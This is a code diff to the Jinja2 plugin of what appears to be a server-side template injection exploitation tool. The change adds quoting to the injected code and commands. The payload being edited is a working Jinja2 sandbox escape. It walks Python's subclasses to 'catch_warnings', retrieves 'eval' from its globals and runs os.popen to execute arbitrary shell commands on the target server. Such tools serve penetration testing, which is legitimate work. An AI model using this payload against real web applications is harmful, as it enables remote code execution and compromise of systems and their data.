@@ -1,8 +1,7 @@
 from core.check import Check
 from utils.loggers import log
 from utils import rand
-import string
-
+from utils.strings import quote
 
 class Jinja2(Check):
 
@@ -33,12 +32,12 @@ class Jinja2(Check):
         self.set('eval', 'python')
 
     def evaluate(self, code):
-        return self.inject("""{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
+        return self.inject("""{%% set d = "%s" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
 {%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
 {%% if 'eval' in b.keys() %%}
-{{ b['eval']('%s') }}
+{{ b['eval'](d) }}
 {%% endif %%} {%% endif %%} {%% endfor %%}
-{%% endif %%} {%% endfor %%}"""  % (code))
+{%% endif %%} {%% endfor %%}"""  % (quote(code)))
 
     def detect_exec(self):
 
@@ -49,7 +48,5 @@ class Jinja2(Check):
 
     def execute(self, command):
 
-        execution_code = '__import__("os").popen("%s").read()' % command
-
-        # TODO: quote command
+        execution_code = '__import__("os").popen("%s").read()' % quote(command)
         return self.evaluate(execution_code)
